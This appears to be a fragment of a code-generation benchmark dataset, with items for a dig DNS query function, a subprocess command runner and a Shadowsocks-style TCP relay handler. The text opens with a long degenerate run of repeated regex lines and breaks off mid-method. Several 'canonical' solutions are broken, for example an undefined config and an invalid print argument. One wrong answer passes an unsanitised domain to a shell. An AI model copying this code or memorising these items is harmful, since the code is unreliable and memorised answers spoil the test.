(\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\"
  },
  {
    "Task_id": 308,
    "Instruction": "Task Description: Write a Python function that queries DNS information for a given domain using the `dig` command, with options for TCP protocol and IPv6.\n\nFunction Description: The function `query_domain` executes a DNS query using the `dig` command-line tool. It retrieves the CNAME and IP address for the specified domain, with configurable query type and DNS server. The function supports TCP protocol and IPv6 queries. It parses the output to extract the first valid CNAME and IP address.\n\nInput:\n- `domain`: [str] - The domain name to query\n- `tcp`: [bool] - Whether to use TCP protocol for the DNS query (default: False)\n- `config`: [dict] - Configuration dictionary containing:\n  - `querytype`: [str] - DNS query type (e.g., 'A', 'AAAA')\n  - `dns`: [str] - DNS server address to query\n\nOutput:\n- [tuple] - A tuple containing:\n  - First valid CNAME found (str), empty string if none\n  - First valid IP address found (str), empty string if none",
    "Canonical_solution": "import subprocess\nimport shlex\n\ndef query_domain(domain, tcp):\n    cmd = \"dig +short +time=2 -6 %s @'%s' '%s'\"\\\n        % (config['querytype'], config['dns'], domain)\n\n    if tcp:\n        cmd = cmd + ' +tcp'\n\n    proc = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE)\n    out, _ = proc.communicate()\n    outarr = out.decode('utf-8').splitlines()\n\n    cname = ip = ''\n    for v in outarr:\n        if cname == '' and validate_domain(v[:-1]):\n            cname = v[:-1]\n        if ip == '' and validate_ip_addr(v):\n            ip = v\n            break\n\n    return (cname, ip)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef query_domain(domain, tcp=False, config=None):\n    if config is None:\n        config = {}\n    querytype = config.get('querytype', 'A')\n    dns = config.get('dns', '8.8.8.8')\n    tcp_option = '-p 53' if tcp else ''\n    ipv6_option = '+ipv6' if querytype == 'AAAA' else ''\n    cmd = f'dig {tcp_option} {ipv6_option} +short {querytype} {domain} @{dns}'\n    output = subprocess.check_output(cmd, shell=True).decode().strip().split('\\n')\n    cname = next((line for line in output if line.startswith('CNAME')), '')\n    ip = next((line for line in output if line.replace('.', '').isdigit()), '')\n    return cname, ip\n```"
  },
  {
    "Task_id": 313,
    "Instruction": "Task Description: Create a function that executes a system command in a specified working directory and handles the command's output and errors.\n\nFunction Description: The function `run_command` executes a given system command in a specified working directory using Python's `subprocess` module. It captures the command's standard output and error streams, decodes them, and prints them. If the command returns a non-zero exit code, it raises a `CalledProcessError`.\n\nInput:  \n- `command`: [str] - The system command to be executed.  \n- `working_dir`: [str] - The working directory where the command will be executed.  \n\nOutput:  \n- None (prints output/error messages directly). Raises `subprocess.CalledProcessError` if the command fails (non-zero exit code).",
    "Canonical_solution": "import os\nimport subprocess\nimport sys\n\ndef run_command(command, working_dir):\n    command_array = command.split(\" \")\n    process = subprocess.Popen(command_array, cwd=working_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    if stdout:\n        print(stdout.decode('utf-8'))\n    if stderr:\n        print(stderr.decode('utf-8'), level=\"error\")\n    if process.returncode != 0:\n        raise subprocess.CalledProcessError(process.returncode, command)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef run_command(command, working_dir):\n    try:\n        result = subprocess.run(command, cwd=working_dir, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n        print(result.stdout)\n    except subprocess.CalledProcessError as e:\n        print(e.stderr)\n        raise e\n```"
  },
  {
    "Task_id": 318,
    "Instruction": "Task Description: Implement a TCP relay handler class that manages communication between a local client and a remote server, handling socket connections, data encryption, and protocol obfuscation.\n\nClass Description: The TCPRelayHandler class is responsible for managing the relay of TCP traffic between a local client and a remote server. It handles socket creation, connection management, data encryption/decryption, and protocol obfuscation. The class integrates with an event loop for asynchronous I/O operations.\n\nAttributes:\n- _server: [object] - Reference to the parent server instance\n- _fd_to_handlers: [dict] - Mapping of file descriptors to handler instances\n- _loop: [object] - Event loop instance for I/O multiplexing\n- _local_sock: [socket.socket] - Local client socket\n- _remote_sock: [socket.socket] - Remote server socket (IPv4)\n- _remote_sock_v6: [socket.socket] - Remote server socket (IPv6)\n- _remote_udp: [bool] - Flag indicating UDP mode\n- _config: [dict] - Configuration parameters\n- _dns_resolver: [object] - DNS resolver instance\n- _is_local: [bool] - Flag indicating local mode\n- _stage: [int] - Current connection stage\n- _encryptor: [object] - Encryption handler\n- _encrypt_correct: [bool] - Encryption status flag\n- _obfs: [object] - Obfuscation handler\n- _protocol: [object] - Protocol handler\n- _fastopen_connected: [bool] - TCP Fast Open status\n- _data_to_write_to_local: [list] - Buffer for data to local client\n- _data_to_write_to_remote: [list] - Buffer for data to remote server\n- _udp_data_send_buffer: [bytes] - UDP data buffer\n- _upstream_status: [int] - Upstream connection status\n- _downstream_status: [int] - Downstream connection status\n- _client_address: [tuple] - Local client address\n- _remote_address: [tuple] - Remote server address\n- _forbidden_iplist: [list] - List of blocked IP addresses\n- _chosen_server: [object] - Selected server instance\n- last_activity: [int] - Timestamp of last activity\n\nMethods:\n- __init__(server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local) -> None - Initializes the handler with server configuration and sockets\n- _create_remote_socket(ip, port) -> socket.socket - Creates and configures a remote socket connection\n- _write_to_sock(data, sock) -> bool - Writes data to a socket with encryption/obfuscation\n- destroy() -> None - Cleans up resources and closes all connections\n- _update_activity() -> None - Updates the last activity timestamp\n- _get_a_server() -> object - Selects an appropriate server from configuration\n- _handle_dns_resolved(result, error) -> None - Callback for DNS resolution\n- _update_stream(stream, status) -> None - Updates stream status in event loop\n- _on_local_read() -> None - Handles local socket read events\n- _on_remote_read() -> None - Handles remote socket read events\n- _on_local_write() -> None - Handles local socket write events\n- _on_remote_write() -> None - Handles remote socket write events",
    "Canonical_solution": "import socket\nimport errno\nimport struct\nimport logging\nimport binascii\nimport traceback\nimport random\nfrom shadowsocks import encrypt, obfs, eventloop, shell, common\nfrom shadowsocks.common import pre_parse_header, parse_header\n\nclass TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._remote_sock = None\n        self._remote_sock_v6 = None\n        self._remote_udp = False\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = STAGE_INIT\n        self._encryptor = encrypt.Encryptor(config['password'], config['method'])\n        self._encrypt_correct = True\n        self._obfs = obfs.obfs(config['obfs'])\n        server_info = obfs.server_info(server.obfs_data)\n        server_info.host = config['server']\n        server_info.port = server._listen_port\n        server_info.tcp_mss = 1440\n        server_info.param = config['obfs_param']\n        self._obfs.set_server_info(server_info)\n        self._protocol = obfs.obfs(config['protocol'])\n        server_info = obfs.server_info(server.protocol_data)\n        server_info.host = config['server']\n        server_info.port = server._listen_port\n        server_info.tcp_mss = 1440\n        server_info.param = ''\n        self._protocol.set_server_info(server_info)\n        self._fastopen_connected = False\n        self._data_to_write_to_local = []\n        self._data_to_write_to_remote = []\n        self._udp_data_send_buffer = b''\n        self._upstream_status = WAIT_STATUS_READING\n        self._downstream_status = WAIT_STATUS_INIT\n        self._client_address = local_sock.getpeername()[:2]\n        self._remote_address = None\n        if 'forbidden_ip' in config:\n            self._forbidden_iplist = config['forbidden_ip']\n        else:\n            self._forbidden_iplist = None\n        if is_local:\n            self._chosen_server = self._get_a_server()\n        fd_to_handlers[local_sock.fileno()] = self\n        local_sock.setblocking(False)\n        local_sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)\n        loop.add(local_sock, eventloop.POLL_IN | eventloop.POLL_ERR, self._server)\n        self.last_activity = 0\n        self._update_activity()\n        self._server.add_connection(1)\n\n    def _create_remote_socket(self, ip, port):\n        if self._remote_udp:\n            addrs_v6 = socket.getaddrinfo(\"::\", 0, 0, socket.SOCK_DGRAM, socket.SOL_UDP)\n            addrs = socket.getaddrinfo(\"0.0.0.0\", 0, 0, socket.SOCK_DGRAM, socket.SOL_UDP)\n        else:\n            addrs = socket.getaddrinfo(ip, port, 0, socket.SOCK_STREAM, socket.SOL_TCP)\n        if len(addrs) == 0:\n            raise Exception(\"getaddrinfo failed for %s:%d\" % (ip, port))\n        af, socktype, proto, canonname, sa = addrs[0]\n        if self._forbidden_iplist:\n            if common.to_str(sa[0]) in self._forbidden_iplist:\n                raise Exception('IP %s is in forbidden list, reject' % common.to_str(sa[0]))\n        remote_sock = socket.socket(af, socktype, proto)\n        self._remote_sock = remote_sock\n        self._fd_to_handlers[remote_sock.fileno()] = self\n\n        if self._remote_udp:\n            af, socktype, proto, canonname, sa = addrs_v6[0]\n            remote_sock_v6 = socket.socket(af, socktype, proto)\n            self._remote_sock_v6 = remote_sock_v6\n            self._fd_to_handlers[remote_sock_v6.fileno()] = self\n            remote_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 32)\n            remote_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 32)\n            remote_sock_v6.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 32)\n            remote_sock_v6.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 32)\n\n        remote_sock.setblocking(False)\n        if self._remote_udp:\n            remote_sock_v6.setblocking(False)\n        else:\n            remote_sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)\n        return remote_sock\n\n    def _write_to_sock(self, data, sock):\n        if not sock:\n            return False\n        uncomplete = False\n        if self._remote_udp and sock == self._remote_sock:\n            try:\n                self._udp_data_send_buffer += data\n                while len(self._udp_data_send_buffer) > 6:\n                    length = struct.unpack('>H', self._udp_data_send_buffer[:2])[0]\n                    if length > len(self._udp_data_send_buffer):\n                        break\n                    data = self._udp_data_send_buffer[:length]\n                    self._udp_data_send_buffer = self._udp_data_send_buffer[length:]\n                    frag = common.ord(data[2])\n                    if frag != 0:\n                        logging.warn('drop a message since frag is %d' % (frag,))\n                        continue\n                    else:\n                        data = data[3:]\n                    header_result = parse_header(data)\n                    if header_result is None:\n                        continue\n                    connecttype, dest_addr, dest_port, header_length = header_result\n                    addrs = socket.getaddrinfo(dest_addr, dest_port, 0, socket.SOCK_DGRAM, socket.SOL_UDP)\n                    if addrs:\n                        af, socktype, proto, canonname, server_addr = addrs[0]\n                        data = data[header_length:]\n                        if af == socket.AF_INET6:\n                            self._remote_sock_v6.sendto(data, (server_addr[0], dest_port))\n                        else:\n                            sock.sendto(data, (server_addr[0], dest_port))\n            except Exception as e:\n                error_no = eventloop.errno_from_exception(e)\n                if error_no in (errno.EAGAIN, errno.EINPROGRESS, errno.EWOULDBLOCK):\n                    uncomplete = True\n                else:\n                    shell.print_exception(e)\n                    self.destroy()\n                    return False\n            return True\n        else:\n            try:\n                if self._is_local:\n                    pass\n                else:\n                    if sock == self._local_sock and self._encrypt_correct:\n                        obfs_encode = self._obfs.server_encode(data)\n                        data = obfs_encode\n                if data:\n                    l = len(data)\n                    s = sock.send(data)\n                    if s < l:\n                        data = data[s:]\n                        uncomplete = True\n                else:\n                    return\n            except (OSError, IOError) as e:\n                error_no = eventloop.errno_from_exception(e)\n                if error_no in (errno.EAGAIN, errno.EINPROGRESS, errno.EWOULDBLOCK):\n                    uncomplete = True\n                else:\n                    shell.print_exception(e)\n                    self.destroy()\n                    return False\n            except Exception as e:\n                shell.print_exception(e)\n                self.destroy()\n                return False\n        if uncomplete:\n            if sock == self._local_sock:\n                self._data_to_write_to_local.append(data)\n                self._update_stream(STREAM_DOWN, WAIT_STATUS_WRITING)\n            elif sock == self._remote_sock:\n                self._data_to_write_to_remote.append(data)\n                self._update_stream(STREAM_UP, WAIT_STATUS_WRITING)\n            else:\n                logging.error('write_all_to_sock:unknown socket')\n        else:\n            if sock == self._local_sock:\n                self._update_stream(STREAM_DOWN, WAIT_STATUS_READING)\n            elif sock == self._remote_sock:\n                self._update_stream(STREAM_UP, WAIT_STATUS_READING)\n            else:\n                logging.error('write_all_to_sock:unknown socket')\n        return True\n\n    def destroy(self):\n        if self._stage == STAGE_DESTROYED:\n            return\n        self._stage = STAGE_DESTROYED\n        if self._remote_sock:\n            try:\n                self._loop.remove(self._remote_sock)\n            except Exception as e:\n                pass\n            del self._fd_to_handlers[self._remote_sock.fileno()]\n            self._remote_sock.close()\n            self._remote_sock = None\n        if self._remote_sock_v6:\n            try:\n                self._loop.remove(self._remote_sock_v6)\n            except Exception as e:\n                pass\n            del self._fd_to_handlers[self._remote_sock_v6.fileno()]\n            self._remote_sock_v6.close()\n            self._remote_sock_v6 = None\n        if self._local_sock:\n            self._loop.remove(self._local_sock)\n            del self._fd_to_handlers[self._local_sock.fileno()]\n            self._local_sock.close()\n            self._local_sock = None\n        if self._obfs:\n            self._obfs.dispose()\n            self._obfs = None\n        if self._protocol:\n            self._protocol.dispose()\n            self._protocol = None\n        self._dns_resolver.remove_callback(self._handle_dns_resolved)\n        self._server.remove_handler(self)\n        self._server.add_connection(-1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nclass TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._remote_sock = None\n        self._remote_sock_v6 = None\n        self._remote_udp = False\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = 0\n        self._encryptor = None\n        self._encrypt_correct = False\n        self._obfs = None\n        self._protocol = None\n        self._fastopen_connected = False\n        self._data_to_write_to_local = []\n        self._data_to_write_to_remote = []\n        self._udp_data_send_buffer = b''\n        self._upstream_status = 0\n        self._downstream_status = 0\n        self._client_address = None\n        self._remote_address = None\n        self._forbidden_iplist = []\n        self._chosen_server = None\n        self.last_activity = time.time()\n        self._init_encryption()\n        self._init_obfs()\n        self._init_protocol()\n        self._init_forbidden_iplist()\n        self._init_local_sock()\n        self._init_remote_sock()\n\n    def _create_remote_socket(self, ip, port):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)\n        sock.settimeout(10)\n        sock.connect((ip, port))\n        return sock\n\n    def _write_to_sock(self, data, sock):\n        if self._encryptor:\n            data = self._encryptor.encrypt(data)\n        if self._obfs:\n            data = self._obfs.obfs(data)\n        if self._protocol:\n            data = self._protocol.handle(data)\n        sock.sendall(data)\n\n    def destroy(self):\n        self._local_sock.close()\n        if self._remote_sock:\n            self._remote_sock.close()\n        if self._remote_sock_v6:\n            self._remote_sock_v6.close()\n        self._fd_to_handlers.pop(self._local_sock.fileno())\n        self._fd_to_handlers.pop(self._remote_sock.fileno())\n        self._fd_to_handlers.pop(self._remote_sock_v6.fileno())\n\n    def _update_activity(self):\n        self.last_activity = time.time()\n\n    def _get_a_server(self):\n        return self._server.get_a_server()\n\n    def _handle_dns_resolved(self, result, error):\n    